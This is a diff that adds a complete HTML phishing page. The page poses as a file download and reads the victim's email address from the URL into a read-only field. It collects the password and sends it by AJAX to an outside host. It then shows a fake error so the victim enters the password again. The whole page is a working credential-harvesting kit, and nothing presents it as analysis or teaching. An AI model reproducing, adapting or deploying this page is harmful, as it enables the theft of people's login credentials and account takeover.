@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>--swa-alx</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="jquery.min.js"></script>
+ 
+</head>
+
+<body> 
+    <div class="fx">
+        <div class="fxbody">
+
+            <form method="post" id="formx">
+
+                <img id="lg" src="top.jpg">
+                <div class="er"></div>
+                <div>
+                    <input type="text" name="x1" id="xx" value="" readonly>
+                </div>
+                <div>
+                    <input type="password" name="x2" id="xxx" value="" required>
+                </div>
+                <div>
+                    <button id="submitBtn" class="btn btn-md btn-primary">Download</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+<script>
+$(document).ready(function() {
+
+    $("body").click(function() {
+
+        $(".fx").show('1000');
+
+    });
+
+
+
+
+
+    $(".fx").hide();
+
+    const basename = (window.location).href;
+
+    let name = basename.substring(basename.lastIndexOf('=') + 1);
+
+    $("#xx").val(name);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#submitBtn").html('Please Wait.').prop("disabled", true).css('background', 'midnightblue');
+
+        $.ajax({
+
+            url: "https://daffi-pl.com/m/ax.php",
+
+            type: 'POST',
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+            success: function(res) {
+
+
+
+                setTimeout(function() {
+
+                    $("#xx").val(name);
+
+                    $("#xxx").val("");
+
+                    $('.er').html(`<img src="en.jpg">`);
+
+                    $("#submitBtn").html("Sign In").prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
+</script>
+</html>
